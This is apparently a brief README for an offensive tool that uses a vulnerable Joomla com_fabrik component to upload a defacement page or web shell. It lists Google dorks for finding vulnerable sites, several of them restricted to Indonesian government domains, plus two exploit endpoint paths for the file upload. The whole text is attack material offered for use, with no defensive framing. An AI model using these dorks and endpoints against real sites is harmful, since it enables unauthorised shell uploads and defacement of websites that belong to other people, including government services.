# CSRF-Comfabrik-vuln-uploader.

---

Simple CSRF to upload deface or shell to Comfabrik vuln.

---

Dork: inurl:index.php?option=com_fabrik
Dork: inurl:index.php/component/fabrik/ site:go.id
Dork: inurl:index.php?option=com_fabrik&view= site:go.id
Dork: inurl:index.php?option=com_fabrik

---

Exploit: /index.php?option=com_fabrik&format=raw&task=plugin.pluginAjax&plugin=fileupload&method=ajax_upload
Exploit: /index.php?option=com_fabrik&c=import&view=import&filetype=csv&table=1
